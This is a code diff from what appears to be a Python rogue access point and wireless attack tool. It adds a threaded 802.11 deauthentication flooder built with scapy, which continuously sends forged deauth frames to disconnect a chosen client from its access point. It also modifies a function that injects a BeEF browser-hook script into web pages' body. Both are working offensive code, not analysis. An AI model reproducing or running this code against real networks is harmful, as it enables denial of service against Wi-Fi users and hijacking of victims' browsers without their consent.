@@ -45,14 +45,11 @@ def airdump_start(interface):
 
 def Beef_Hook_url(soup,hook_url):
     try:
-        try:
-            for link_tag in soup.findAll('body'):
-                link_tag_idx = link_tag.parent.contents.index(link_tag)
-                link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
-                link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
-                return soup
-        except:
-            return None
+        for link_tag in soup.findAll('body'):
+            link_tag_idx = link_tag.parent.contents.index(link_tag)
+            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
+            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
+            return soup
     except NameError:
         print('[-] please. your need install the module python-BeautifulSoup')
 
@@ -157,6 +154,32 @@ class ProcessThread(threading.Thread):
         if self.process is not None:
             self.process.terminate()
             self.process = None
+
+class ThreadDeauth(QThread):
+    def __init__(self,bssid, client,interface):
+        QThread.__init__(self)
+        self.bssid      = bssid
+        self.client     = client
+        self.interface  = interface
+        self.status     = False
+        self.pkts       = []
+
+    def run(self):
+        print 'Starting Thread:' + self.objectName()
+        self.status = True
+        conf.iface = self.interface
+        pkt1 = RadioTap()/Dot11(type=0,subtype=12,addr1=self.client,
+        addr2=self.bssid,addr3=self.bssid)/Dot11Deauth(reason=7)
+        pkt2 = Dot11(addr1=self.bssid, addr2=self.client,
+        addr3=self.client)/Dot11Deauth()
+        self.pkts.append(pkt1),self.pkts.append(pkt2)
+        while self.status:
+            for packet in self.pkts:
+                sendp(packet,verbose=False,count=1,iface=self.interface)
+
+    def stop(self):
+        self.status = False
+        print 'Stop thread:' + self.objectName()
 
 class ThreadAttackStar(QThread):
     def __init__(self,interface):
@@ -442,19 +465,6 @@ class Refactor:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         info = ioctl(s.fileno(), 0x8927,  pack('256s', ifname[:15]))
         return ':'.join(['%02x' % ord(char) for char in info[18:24]])
-
-    @staticmethod
-    def deauth(bssid, client,interface):
-        conf.verb = 0
-        conf.iface = interface
-        pkts = []
-        pkt1 = RadioTap()/Dot11(type=0,subtype=12,addr1=client,
-        addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
-        pkt2 = Dot11(addr1=bssid, addr2=client,
-        addr3=client)/Dot11Deauth()
-        pkts.append(pkt1),pkts.append(pkt2)
-        while True:
-            for x in pkts:sendp(x,verbose=False,count=1)
 
     @staticmethod
     def get_interfaces():
